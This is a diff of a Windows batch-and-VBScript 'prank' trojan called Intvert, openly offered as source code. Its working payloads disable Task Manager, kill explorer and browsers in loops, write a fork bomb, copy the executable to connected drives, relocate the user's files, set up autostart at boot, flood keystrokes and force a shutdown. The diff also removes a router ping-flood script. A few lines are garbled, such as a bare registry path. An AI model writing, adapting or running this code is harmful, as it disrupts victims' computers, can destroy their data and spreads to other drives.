@@ -1,6 +1,6 @@
 @echo off
 goto skipmainscript
-:indone
+:setupDone
 del state
 echo 1 > state
 :: This is a "ease of acces" config for the scripts that will run after setup
@@ -14,11 +14,10 @@ echo 1 > state
 :: S5.vbs     | Open Random system aplications                                | Shity payload
 :: S6.vbs     | Cycle between light and dark mode for desktop                 | Like inverting the desktop, but not
 :: S7.vbs     | Change background                                             | Make sure the path is correct
-:: S8.vbs     | Bomb payload                                                  | Very simple yet effective, will cause errors if left on to long
+:: S8.vbs     | Batch Bomb payload                                            | Very simple yet effective, will cause errors if left on to long
 :: S9.vbs     | Move all files in desktop/music/photos/downloads to documents | Only use if you hate the person who is reciving this file
 :: S10.vbs    | Copy exe to any connected drives                              | Dosen't work for usb
-:: S12.vbs    | Find router ip and ping it                                    | It wont bring the router down by-itself...
-:: kes.vbs    | Send keystrokes (Set to Hit-Me-Again by defult)               | Using - instaed of spaces so browers wouldn't scroll
+:: kes.vbs    | Send keystrokes (Set to TRYING-TO-TYPE? by defult)            | Using - instaed of spaces so browers wouldn't scroll
 :: Main.vbs   | Music file No.1                                               |
 :: Cheeta.vbs | Music file No.2                                               |
 :: Bus.vbs    | Music file No.3                                               |
@@ -26,7 +25,7 @@ echo 1 > state
 :: StartUp.vbs| Music file No.5                                               |
 :: BunDem.vbs | Music file No.6                                               |
 :: end.vbs    | REST IN PISS FOREVER MISS                                     | Popup message
-:: v.vbs      | Max volume                                                    | Maxes out the volume by continuesly sending the volume up key
+:: v.vbs      | Max out volume                                                | Maxes out the volume by continuesly sending the volume up key
 ::-----------------------------------------------------------------------------------------------------------------------------------------------
 :: 2 files are made to make the script run by itself in the background after boot this includes date.bat & S11.vbs
 :: The .bat is responsable for regignising weither or not the user has restarted/shutdown early, along with bat running seperate payloads depending on date.
@@ -44,13 +43,12 @@ Rundll32 user32,SwapMouseButton
 start s7.vbs
 start Main.vbs
 start /max %userprofile%\Documents\Yes.txt
-:: Open a txt document trying to scare the user
-timeout /t 22 /nobreak
-:: Fun fact: Without error the website payload used to, and should be timed with the drop of the song
+:: Open a txt document informing the user of their decision
+timeout /t 17 /nobreak
 start S2.vbs
 start S6.vbs
 start kes.vbs
-timeout /t 38 /nobreak
+timeout /t 30 /nobreak
 start v.vbs	
 start S3.vbs
 timeout /t 34 /nobreak
@@ -99,12 +97,12 @@ REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d
 :: If you are using a uncompiled version uncoment the above and comment out the bellow
 ::-------From-Here-------
 TASKKILL /F /IM cmd.exe
+::--------To-Here--------
 TASKKILL /F /IM explorer.exe
 TASKKILL /F /IM firefox.exe
 TASKKILL /F /IM chrome.exe
 TASKKILL /F /IM MicrosoftEdge.exe
 TASKKILL /F /IM Magnify.exe
-::--------To-Here--------
 start end.vbs
 timeout /t 5 /nobreak
 if %Bluescreen%==0 shutdown /s /f /c " " /t 1
@@ -125,7 +123,7 @@ TASKKILL /F /IM firefox.exe
 TASKKILL /F /IM chrome.exe
 TASKKILL /F /IM MicrosoftEdge.exe
 TASKKILL /F /IM Magnify.exe
-
+	
 goto killeda
 
 :killeverythingb
@@ -158,6 +156,11 @@ IF %ERRORLEVEL% EQU 0 (
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 taskkill /f /im taskmgr.exe
 taskkill /f /im regedit.exe
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
+
+
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
 :: Hide desktop icons, then restart explorer (makes the above script more reliable)
 taskkill /f /im explorer.exe
@@ -215,13 +218,13 @@ goto afterwads
   echo a shorter expirence then if you were to run it on a real pc
   echo.
   echo This exe isn't distructive and if you are super nervous you can
-  echo download a "uncompiled" version from B0N3head github and see what
-  echo makes me tick.) >%userprofile%\VM1.txt
-start %userprofile%\VM1.txt
+  echo download a "uncompiled" version from B0N3head's github and see what
+  echo makes me tick.) >%userprofile%\Documents\VM1.txt
+start %userprofile%\Documents\VM1.txt
 set /a VMware=1
 :afterwads
 ::-------------------------------------------------------------
-xcopy "%~dp0%Cheeta.mp3" "c:\windows\sIntvert" /s /h.
+xcopy "%~dp0%Cheeta.mp3" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%Christmas.mp3" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%Main.mp3" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%MakeItDemBurn.mp3" "c:\windows\sIntvert" /s /h
@@ -230,8 +233,7 @@ xcopy "%~dp0%TitleScreen.mp3" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%main.bat" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%pic.jpg" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%bkg1.jpg" "c:\windows\sIntvert" /s /h
-xcopy "%~dp0%Intvert.exe" "c:\windows\sIntvert" /s /h
-xcopy "%~dp0%Restore.exe" "%userprofile%\desktop" /s /h
+xcopy "%~dp0%Intvert.exe" "c:\windows\sIntvert" /s /h	
 xcopy "%userprofile%\downloads\Cheeta.mp3" "c:\windows\"sIntvert /s /h.
 xcopy "%userprofile%\downloads\Christmas.mp3" "c:\windows\sIntvert" /s /h
 xcopy "%userprofile%\downloads\Main.mp3" "c:\windows\sIntvert" /s /h
@@ -264,13 +266,6 @@ pause
 :: Main Scripts Now
 ::--------------------BAT---------------------------
 ( echo @echo off
-  echo for /f "tokens=2^,3 delims={,}" %%%%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "^'^) do echo %%%%~a ^> ip
-  echo set /p router= ^< ip 
-  echo del ip
-  echo :p
-  echo ping %%router%% -t -l 65500
-  echo goto p) > p.bat
-( echo @echo off
   echo :sd
   echo xcopy c:\windows\sIntvert\Intvert.exe A:\ /y
   echo xcopy c:\windows\sIntvert\Intvert.exe B:\ /y
@@ -300,6 +295,7 @@ pause
   echo timeout /t 120 /nobreak > nul
   echo goto sd) > idla.bat
 ( echo %%0% %^|% %%%0%) > bomb.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo cd c:\windows\sIntvert
   echo set /p cheat= ^< state
@@ -352,7 +348,7 @@ pause
   echo if %%Rand%%==3 start http://google.co.ck/search?q=ubisoft+always+on+drm
   echo if %%Rand%%==4 start https://www.humblebundle.com/store/agecheck/far-cry-3
   echo if %%Rand%%==5 start https://www.thegamer.com/far-cry-3-easter-eggs/
-  echo ping 192.0.2.1 -n 1 -w 9333 >nul
+  echo timeout /t 5 /nobreak
   echo goto frycraft
   echo :HBChinese
   echo set /a randdir=%%random%% %%%%5
@@ -367,10 +363,11 @@ pause
   echo echo ^^^</xd^^^>^)^>HBC.html
   echo :: A random dir is selected from a list because web browers show the dir
   echo :: giving the user the dir could result in the user finding out where all 
-  echo :: of the files are hid and thats a no no
+  echo :: of the files are hidden and thats a no no
   echo start HBC.html
-  echo timeout /t 60 /nobreak
+  echo timeout /t 1 /nobreak
   echo del HBC.html
+  echo timeout /t 60 /nobreak
   echo goto HBChinese
   echo :Christmas
   echo start XMAS.vbs
@@ -378,6 +375,7 @@ pause
   echo :BLACK
   echo timeout /t 2 /nobreak
   echo taskkill /f /im explorer.exe
+  echo taskkill /f /im taskmgr.exe /t
   echo goto BLACK
   echo :naughty
   echo start naughty1.vbs
@@ -388,6 +386,7 @@ pause
   echo timeout /t 12 /nobreak
   echo goto BrthDay)>date.bat
 :: This was a pain to make work (above)
+::--------------------------------------------------------------------
 ( echo @echo off
   echo :check
   echo set /a Rand=%%random%% %%%%4
@@ -399,6 +398,7 @@ pause
   echo start C:\WINDOWS\system32\Magnify.exe
   echo timeout /t 3
   echo goto check) > a.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo :check
   echo set /a Rand=%%random%% %%%%46
@@ -452,6 +452,7 @@ pause
   echo if %%Rand%%==45 start https://advanced-systemcare-ultimate.en.softonic.com/
   echo timeout /t 7
   echo goto check) > b.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo cd C:\WINDOWS\system32
   echo :a
@@ -461,7 +462,8 @@ pause
   echo start Magnify.exe
   echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
   echo ping 192.0.2.1 -n 1 -w 1666 ^>nul
-  echo goto a) >vape.bat  
+  echo goto a) >vape.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo cd C:\WINDOWS\system32
   echo :a
@@ -480,6 +482,7 @@ pause
   echo REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
   echo timeout /t 3
   echo goto check) > d.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo :check
   echo set /a Rand=%%random%% %%%%20
@@ -508,6 +511,7 @@ pause
   echo if %%Rand%%==19 rundll32.exe shell32.dll,Control_RunDLL tabletpc.cpl
   echo timeout /t 6
   echo goto check) > e.bat
+::--------------------------------------------------------------------  
 ( echo @echo off
   echo :asd
   echo set /a a=%%random%% %%%%1
@@ -518,6 +522,7 @@ pause
   echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D %c% /F
   echo timeout /t 4
   echo goto asd) > f.bat
+::--------------------------------------------------------------------
 ( echo @echo off
   echo cd c:\windows\sIntvert
   echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\pic.jpg /f
@@ -528,6 +533,7 @@ pause
   echo set /a lo=%%lo%%+1
   echo if %%lo%%==256 exit
   echo goto noea) > g.bat
+::--------------------------------------------------------------------
 ( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
   echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
   echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
@@ -550,7 +556,7 @@ pause
   echo if %%drs%% ==5 cd %%userprofile%%\documents
   echo if %%drs%% ==6 goto noRest
   echo goto daws) > h.bat
-:: This script is evil and isn't used
+:: This script is bad and shouldn't be used
 ::--------------------VBS---------------------------
 ( echo do
   echo x=msgbox("It's Christmas, Go Outside",48,"Give me a break"^)
@@ -644,33 +650,35 @@ cd c:\windows\sIntvert
 ( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
   echo do
   echo wscript.sleep 1000
-  echo wshshell.sendkeys "{H}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{I}"
-  echo wscript.sleep 10
   echo wshshell.sendkeys "{T}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{-}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{M}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{E}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{-}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{A}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{G}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{A}"
-  echo wscript.sleep 10
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{R}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{Y}"
+  echo wscript.sleep 50
   echo wshshell.sendkeys "{I}"
-  echo wscript.sleep 10
+  echo wscript.sleep 50
   echo wshshell.sendkeys "{N}"
-  echo wscript.sleep 10
-  echo wshshell.sendkeys "{!}"
-  echo wscript.sleep 10
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{G}"
+  echo wscript.sleep 50
   echo wshshell.sendkeys "{-}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{T}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{O}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{-}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{T}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{Y}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{P}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{E}"
+  echo wscript.sleep 50
+  echo wshshell.sendkeys "{?}"
   echo loop) >kes.vbs
 ( echo do
   echo Set WshShell = CreateObject("WScript.Shell"^)
@@ -687,29 +695,18 @@ cd %userprofile%\Documents
   echo Enjoy :D) >Yes.txt
 ( echo Your computer hasn't been trashed by any tojan
   echo.
-  echo This program isn't harmfull, its just made to scare or prank you.
+  echo This program isn't harmfull, its just made to scare or prank people.
   echo This program changes some regestry keys, to revert this a 
   echo .bat has been made on the desktop to reset the regkeys and
   echo everything else that was changed in the process. 
-  echo Don't delete the .bat until use, otherwise there will be no way to 
+  echo Don't delete the .bat until used, otherwise there will be no way to 
   echo revert changed reg keys, unless done manually.
   echo.
   echo But since your still here we might aswell give you a show) >GiveItASec.txt
 cd c:\windows\sIntvert
-goto indone
+goto setupDone
 
 :NONADMIN
-:: This script will run without admin but will be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges
-( echo Your computer has now been infected by the Intvert tojan.
-  echo Have fun trying to use your computer, it won't last long.
-  echo.
-  echo Shutting down won't stop anything and actialy has a chance
-  echo of harming your system, so don't.
-  echo Enjoy :D) >Yes.txt
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "Main.mp3"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Main.vbs
+:: This script will try to run the above but without admin, it WILL be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges
+( echo Please launch as admin) >Yes.txt
+start Yes.txt
